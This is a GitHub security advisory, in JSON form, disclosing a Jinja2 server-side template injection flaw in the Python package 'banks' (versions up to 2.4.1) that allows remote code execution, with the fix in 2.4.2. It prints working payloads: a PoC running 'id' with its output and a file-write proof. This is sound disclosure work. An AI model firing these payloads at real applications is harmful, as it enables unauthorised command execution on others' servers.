{"credits": [{"type": "reporter", "user": {"avatar_url": "https://avatars.githubusercontent.com/u/279425301?v=4", "events_url": "https://api.github.com/users/Anandakrishnasv/events{/privacy}", "followers_url": "https://api.github.com/users/Anandakrishnasv/followers", "following_url": "https://api.github.com/users/Anandakrishnasv/following{/other_user}", "gists_url": "https://api.github.com/users/Anandakrishnasv/gists{/gist_id}", "gravatar_id": "", "html_url": "https://github.com/Anandakrishnasv", "id": 279425301, "login": "Anandakrishnasv", "node_id": "U_kgDOEKexFQ", "organizations_url": "https://api.github.com/users/Anandakrishnasv/orgs", "received_events_url": "https://api.github.com/users/Anandakrishnasv/received_events", "repos_url": "https://api.github.com/users/Anandakrishnasv/repos", "site_admin": false, "starred_url": "https://api.github.com/users/Anandakrishnasv/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/Anandakrishnasv/subscriptions", "type": "User", "url": "https://api.github.com/users/Anandakrishnasv", "user_view_type": "public"}}], "cve_id": "CVE-2026-44209", "cvss": {"score": 7.5, "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H"}, "cvss_severities": {"cvss_v3": {"score": 7.5, "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H"}, "cvss_v4": {"score": 0.0, "vector_string": null}}, "cwes": [{"cwe_id": "CWE-1336", "name": "Improper Neutralization of Special Elements Used in a Template Engine"}], "description": "## Summary

`banks <= 2.4.1` uses `jinja2.Environment()` (unsandboxed) to render prompt templates. Applications that pass user-supplied strings as the template argument to `Prompt()` are vulnerable to Server-Side Template Injection (SSTI), which can lead to Remote Code Execution (RCE) on the host system.

This is a vulnerability in how `banks` initializes its Jinja2 environment — not in Jinja2 itself.

## Vulnerable Code

`src/banks/env.py` — the global Jinja2 environment is created without sandboxing:

```python
env = Environment(
    autoescape=select_autoescape(enabled_extensions=("html", "xml"), default_for_string=False),
    ...
)
```

## Attack Scenario

An application that stores prompt templates in a database, accepts them via an API, or loads them from a user-supplied config file and passes them to `Prompt()` is vulnerable. For example:

```python
# User-controlled input reaches Prompt()
user_input = "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}"
p = Prompt(user_input)
p.text()  # Executes arbitrary command on the host
```

## Proof of Concept

**Setup:**
```bash
pip install banks==2.4.1
```

**PoC script:**
```python
from banks import Prompt

payload = "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}"
p = Prompt(payload)
result = p.text()
print(f"[+] Output: {result}")
```

**Confirmed output:**
```
[+] Output: uid=1000(ak) gid=1000(ak) groups=1000(ak),27(sudo),...

text

**File-write proof:**
```python
from banks import Prompt

p = Prompt("{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo POC > /tmp/rce_banks_exec').read() }}")
p.text()
```
```bash
ls -l /tmp/rce_banks_exec
# -rw-rw-r-- 1 ak ak 4 Apr 27 15:36 /tmp/rce_banks_exec
```

## Impact

Applications that allow end-users to supply or customize prompt templates are at risk of full Remote Code Execution, including arbitrary command execution, data exfiltration, and server compromise.

## Fix

Fixed in `banks 2.4.2` (PR #74) by switching to `jinja2.sandbox.SandboxedEnvironment`, which blocks the dunder attribute traversal chain this exploit relies on.

Developers on `banks <= 2.4.1` should upgrade to `2.4.2` and avoid passing untrusted user input as the template argument to `Prompt()`.

## Resources
- Fix: https://github.com/masci/banks/pull/74
- CVE-2024-41950 (Haystack — identical root cause, CVSS 7.5)
- CVE-2025-25362 (spacy-llm — identical root cause)
- CWE-1336: Improper Neutralization of Special Elements in a Template Engine", "epss": {"percentage": 0.00539, "percentile": 0.4151}, "ghsa_id": "GHSA-gphh-9q3h-jgpp", "github_reviewed_at": "2026-05-08T20:36:22Z", "html_url": "https://github.com/advisories/GHSA-gphh-9q3h-jgpp", "identifiers": [{"type": "GHSA", "value": "GHSA-gphh-9q3h-jgpp"}, {"type": "CVE", "value": "CVE-2026-44209"}], "nvd_published_at": "2026-05-26T21:16:37Z", "published_at": "2026-05-08T20:36:22Z", "references": ["https://github.com/masci/banks/security/advisories/GHSA-gphh-9q3h-jgpp", "https://github.com/masci/banks/pull/74", "https://nvd.nist.gov/vuln/detail/CVE-2026-44209", "https://github.com/advisories/GHSA-gphh-9q3h-jgpp"], "repository_advisory_url": "https://api.github.com/repos/masci/banks/security-advisories/GHSA-gphh-9q3h-jgpp", "severity": "high", "source_code_location": "https://github.com/masci/banks", "summary": "banks has Critical Remote Code Execution (RCE) via Jinja2 SSTI", "type": "reviewed", "updated_at": "2026-06-08T23:29:17Z", "url": "https://api.github.com/advisories/GHSA-gphh-9q3h-jgpp", "vulnerabilities": [{"first_patched_version": "2.4.2", "package": {"ecosystem": "pip", "name": "banks"}, "vulnerable_functions": [], "vulnerable_version_range": "<= 2.4.1"}], "withdrawn_at": null}

title: banks has Critical Remote Code Execution (RCE) via Jinja2 SSTI
